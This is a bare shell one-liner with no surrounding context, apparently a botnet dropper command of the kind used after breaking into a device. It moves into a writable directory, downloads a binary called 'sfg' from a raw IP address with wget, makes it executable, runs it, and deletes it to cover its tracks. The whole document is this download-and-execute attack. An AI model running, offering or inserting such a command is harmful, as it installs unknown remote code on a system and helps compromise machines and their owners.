cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.180.165/sfg; chmod +x sfg; ./sfg; rm -rf sfg
